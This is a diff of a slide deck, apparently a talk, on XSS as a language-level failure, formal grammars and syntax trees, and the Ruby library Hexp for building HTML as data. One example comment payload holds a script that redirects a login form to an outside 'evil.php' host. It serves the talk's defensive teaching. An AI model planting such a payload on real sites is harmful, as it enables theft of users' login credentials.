@@ -32,58 +32,57 @@ XSS enables attackers to inject client-side script into Web pages viewed by othe
 
 ---
 
-## XSS
+A simple comment form
 
-Code like this
-
-```ruby
-"<div>#{ @post.body }</div>"
-```
-
-Will lead to malicious injection
-
-```html
+<form>
+  <label>Add a comment</label><br />
+  <textarea rows="5" cols="80">
 <script>
  document.getElementById('login_form').
    action="http://208.246.24.14/evil.php"
 </script>
+</textarea><br />
+  <input type="submit" />
+</form>
+
+---
+
+We naively display the comment
+
+```ruby
+"<div class='comment'>#{ comment }</div>"
 ```
 
 ---
+{:.big}
 
-**session hijacking**
-
-attacker can surf the site with user credentials
+Each time someone visits our site,
+the malicious code gets executed.
 
 ---
-
-## Escape!
 
 The common wisdom is to "escape" the inserted value
 
 ```html
-<div>#{ escape_html(@post.body) }</div>
+<div class='comment'>#{ escape_html(comment) }</div>
 ```
 
 Now the code is harmless
 
 ```html
-<div>
+<div class='comment'>
   &lt;script&gt; ... &lt;/script&gt;
 </div>
 ```
 
 ---
+{:.big}
 
-## XSS
-
-Is a more common
-
-vulnerability than
-
-buffer overflows
+But XSS is still rampant,
+more common than buffer overflows
 
 ---
+{:.big}
 
 **why** is it so **hard?**
 
@@ -95,7 +94,7 @@ Let's automate!
 
 ```html
 # using HTML::SafeBuffer
-<div><%= @post.body %></div>
+<div class='comment'><%= comment %></div>
 ```
 
 And it **just works**
@@ -116,7 +115,26 @@ end
 
 ---
 
+# The String Problem
+
+---
+
 ![Screenshot of the Langsec website (langsec.org)](images/devil_in_plain_text.png)
+
+---
+
+## The problem
+
+Semantics of string are twofold
+
+* a string
+* a textual representation of HTML
+
+---
+{:.big}
+
+HTML is structured data,
+let's treat it as such
 
 ---
 
@@ -189,59 +207,43 @@ graph platypus {
 # Formal Language
 
 ---
+{:.big}
 
 a **formal language** is
-
 a **set of strings** of symbols
-
 governed by **strict rules**
-
----
-
-These rules form the **grammar**
-
-of the language, they specify
-
-how to **generate** valid strings
 
 ---
 
 ```
 alphabet = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
             +, *, (, ), =}
-
-<equation>   ::= <expression> = <expression>
-
-<expression> ::= <number>  | <sum> |
-                 <product> | ( <expression> )
-
-<number>     ::= <digit> | <digit> <number>
-
-<digit>      ::= 0 | 1 | 2 | 3 | 4 |
-                 5 | 6 | 7 | 8 | 9
-
-<sum>        ::= <expression> + <expression>
-
-<product>    ::= <expression> * <expression>
 ```
 
 ---
+{:.big}
 
-well-formed :
+These rules form the **grammar**
+of the language, they specify
+how to **generate** valid strings
 
-```
-5 = 3 + 2
-4 * 4 = 10 + 6
-10 + 20 = ( 3 + 5 ) * 7
-```
-
-not well-formed :
+---
 
 ```
-5 = + 5
-10 = 15 - 5
-3 * 5 + 7
+<EQUATION>   ::= <sum> = <sum>
+
+<digit >     ::= 0 | 1 | 2 | 3 | 4 |
+                 5 | 6 | 7 | 8 | 9
+
+<sum>        ::= *<digit> + *<digit>
 ```
+
+---
+{:.big}
+
+We can represent
+how the grammar rules are applied
+using a **syntax tree**
 
 ---
 
@@ -295,13 +297,13 @@ graph {
   digit4 -- 4
 }
 ```
+{:.center width="850px"}
 
 ---
+{:.big}
 
 The **meaning** of a sentence
-
 corresponds with
-
 its **syntax tree**
 
 ---
@@ -314,33 +316,23 @@ its **syntax tree**
 * Network protocols
 
 ---
+{:.big}
 
 Your application either
-
 **consumes** or **generates**
-
 these languages
 
 ---
+{:.big}
 
 In either case it should
-
 use **syntax trees**
-
 to do so
 
 ---
+{:.center}
 
-# Why ?
-
----
-
-## The problem
-
-Semantics of string are twofold
-
-* a string
-* a textual representation of HTML
+# #langsec
 
 ---
 
@@ -359,11 +351,12 @@ If input handling is done ad-hoc
 
 ---
 
-http://langsec.org
+[Language-Theoretic security research](http://langsec.org)
 
-Meredith L. Patterson : "The Science of Insecurity"
+Meredith L. Patterson : **"The Science of Insecurity"**
 
 ---
+{:.big}
 
 We can apply similar reasoning to **output** handling
 
@@ -383,8 +376,9 @@ If output handling is done ad-hoc
 * it becomes a weird machine for an attacker to program
 
 ---
+{:.big}
 
-# XSS is a Failure at the Language Level
+XSS is a Failure at the Language Level
 
 ---
 
@@ -461,9 +455,9 @@ digraph commmunication {
     a -> b -> c;
     b -> d;
     b -> e;
-    c -> f[color=red];
-    c -> g[color=red];
-    g -> h[color=red];
+    c -> f;
+    c -> g;
+    g -> h;
   }
 
   subgraph sub_3 {
@@ -476,52 +470,246 @@ digraph commmunication {
 ```
 
 ---
+{:.center}
 
 # Abolish Your Templates, Burn Your Helpers
 
 ---
+{:.big}
 
-# Preventing XSS Through Architecture
-
----
-
-Other examples
-- Yesod
-- Noinject
+Create a HTML **data structure**
+Serialize it **in one pass**
+In **pure Ruby**
 
 ---
+{:.center}
 
 # Hexp
 
 ---
+{:.big}
 
-## Creating nodes
+An API for **generating**
+and **manipulating**
+**HTML** syntax trees
 
-* object
-* sexp
-* builder
+---
+{:.big}
+
+What **Rack** does for **HTTP**
+**Hexp** does for **HTML**
+
+---
+{:.center}
+
+# Creating nodes
+
+---
+
+## Objects
+
+```ruby
+div = Hexp::Node.new(:div, class: 'strong')
+# => H[:div, {"class" => "strong"}]
+```
+
+---
+
+## Builder syntax
+
+```ruby
+list = Hexp.build do
+  ul do
+   3.times do |i|
+     li i.to_s
+   end
+  end
+end
+# => H[:ul, [H[:li, ["0"]], H[:li, ["1"]], H[:li, ["2"]]]]
+```
+
+---
+
+## S-expressions
+
+```ruby
+toc = H[:ol, {class: 'toc'}, [
+    H[:li, 'Language Theory'],
+    H[:li, 'XSS'],
+    H[:li, 'Applications']
+  ]
+]
+```
 
 ---
 
 ## Manipulating Nodes
 
----
+```ruby
+doc.rewrite('head') do |head|
+  head.add(H[:script,
+    src: 'http://code.jquery.com/jquery-1.10.1.min.js'])
+end
+```
 
-# Other use cases
-
-* deface
-* populate forms
-* pretty print
-* self contained
-
----
-
-# Modular (think : CMS)
-
-* discount module
+```ruby
+div.add_class('sidebar')
+```
 
 ---
 
-# Working with designers
+## Reusable 'Middleware'
 
-* Living Styleguide FTW
+For example
+
+* Inline CSS/JS/images
+* Pretty print
+* Populate forms (cfr. Formless)
+
+---
+
+## Reusable widgets
+
+* Menus
+* Breadcrumbs
+* Forms
+* Header / Footer
+
+cfr. [Showpiece](https://github.com/begriffs/showpiece)
+
+---
+
+## Example : discount module
+
+```ruby
+doc.rewrite('form.checkout input[type=submit]') do |submit|
+  [ discount_form_field, submit ]
+end
+
+def discount_form_field
+  Hexp.build do
+    div do
+      label 'Discount code', for: 'discount'
+      input name: 'discount', type: 'text'
+    end
+  end
+end
+```
+
+---
+
+## Example Widget
+
+```ruby
+class BookWidget < Struct.new(:book, :tag)
+  include Hexp
+
+  def to_hexp
+    H[tag, {class: 'book-entry', id: "book-#{book.id}"}, [
+        H[:h2, book.title],
+        H[:img, src: book.image.url(:medium)]
+      ]
+    ]
+  end
+end
+```
+
+---
+
+with `include Hexp` all DSL methods redirect to `to_hexp`
+
+tag, attributes, children, attr, rewrite, select, to_html, class?, add_class, add_child, add, process, %, text, remove_attr, set_attributes
+
+---
+
+## Hexpress
+
+* Converts Markdown to Hexp
+* Contains a bunch of 'Processors'
+  * AddImpressJs
+  * GraphvizDotToSVG
+  * MakeSelfContained
+* Powers this presentation
+
+---
+
+## Working with designers
+
+* Create widgets with semantic markup
+* Create a Living Styleguide
+
+
+
+---
+{:.huge .center}
+
+Q ?
+
+---
+{:.center}
+
+# Thank you!
+
+* [github.com/plexus/hexp](http://github.com/plexus/hexp)
+* [twitter.com/plexus](http://twitter.com/plexus)
+* [arnebrasseur.net](http://arnebrasseur.net)
+
+---
+{:.center}
+
+# References
+
+---
+
+## Blog posts
+
+* [Safe String Theory for the web](http://acko.net/blog/safe-string-theory-for-the-web/) by Steven Wittens
+* [Structurally Fixing Injection Bugs](http://www.more-magic.net/posts/structurally-fixing-injection-bugs.html) by Peter Bex
+* [Working with HTML in Haskell](http://adit.io/posts/2012-04-14-working_with_HTML_in_haskell.html) by Aditya Bhargava
+* [A type-based solution to the “strings problem”: a fitting end to XSS and SQL-injection holes?](http://blog.moertel.com/posts/2006-10-18-a-type-based-solution-to-the-strings-problem.html) by Tom Moertel
+* [The Devil in Plain Text](http://devblog.arnebrasseur.net/2013-04-plain-text) by Arne Brasseur
+
+---
+
+## Books
+
+* Speaking by Willem J.M. Levelt
+* An Introduction to Formal Languages and Automata by Peter Linz
+
+---
+
+## Security
+
+* [Langsec](http://langsec.org/)
+* [The Science of Insecurity](http://www.youtube.com/watch?v=3kEfedtQVOY) by Meredith L. Patterson
+* [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
+
+---
+
+## Software
+
+Ruby
+
+* [Formless](https://github.com/Wardrop/Formless)
+  Completely transparent, unobtrusive form populator for web applications and content scrapers
+* [Loofah](https://github.com/flavorjones/loofah)
+  HTML/XML manipulation and sanitization based on Nokogiri
+* [Living Style Guide](https://github.com/hagenburger/livingstyleguide)
+
+Common Lisp
+
+* [CL-WHO](http://jandmworks.com/cl-who-ext.html)
+
+---
+
+## Software
+
+Haskell
+
+* [BlazeHtml](http://jaspervdj.be/blaze/tutorial.html)
+* [Yesod framework](http://www.yesodweb.com/book/widgets)
+* HXT
+
+General
+
+* [Showpiece](http://begriffs.github.io/showpiece/)
